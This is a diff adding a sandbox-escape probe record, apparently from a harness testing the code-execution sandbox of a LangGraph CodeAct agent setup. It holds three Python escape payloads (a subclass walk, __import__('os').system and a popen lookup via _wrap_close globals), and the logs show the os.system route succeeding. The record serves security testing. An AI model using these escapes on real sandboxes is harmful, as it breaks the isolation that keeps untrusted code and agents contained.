@@ -1,0 +1,53 @@
+probe: P12
+outcome: escaped
+display: escaped (os.system)
+detail: P12a subclasses walk: failed; 'TypeError: Type is not msgpack serializable: type' | P12b __import__('os').system: ran; 'SYSTEM 0' | P12c _wrap_close globals popen: failed; 'TypeError: Type is not msgpack serializable: type'
+
+code:
+----
+subs = ().__class__.__base__.__subclasses__()
+names = [c.__name__ for c in subs]
+msg = 'SUBS ' + str(len(subs)) + ' ' + str('_wrap_close' in names) + ' ' + str('Popen' in names)
+print(msg)
+msg
+----
+msg = "SYSTEM " + str(__import__("os").system("echo PWNED"))
+print(msg)
+msg
+----
+wc = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close']
+msg = 'WRAP ' + wc[0].__init__.__globals__['popen']('echo PWNED2').read()
+print(msg)
+msg
+----
+
+setup_ms: 1.9
+wall_s (whole child process): 0.37
+killed: None
+child exit code: 0
+peak tree RSS GB: 0.064
+host lookup calls: 0
+
+=== run 0 (2.8 ms) ===
+ok: false
+error: TypeError: Type is not msgpack serializable: type
+raised: true
+
+=== run 1 (6.0 ms) ===
+ok: true
+stdout: SYSTEM 0
+
+error: null
+context_keys: ["msg"]
+host_builtins_leak: false
+
+=== run 2 (8.2 ms) ===
+ok: false
+error: TypeError: Type is not msgpack serializable: type
+raised: true
+
+=== child process log (tail) ===
+~/p/agentic-search-bench/research/impls/langgraph-codeact/.venv/lib/python3.12/site-packages/langgraph/checkpoint/base/__init__.py:17: LangChainPendingDeprecationWarning: The default value of `allowed_objects` will change in a future version. Pass an explicit value (e.g., allowed_objects='messages' or allowed_objects='core') to suppress this warning.
+  from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer
+PWNED
+
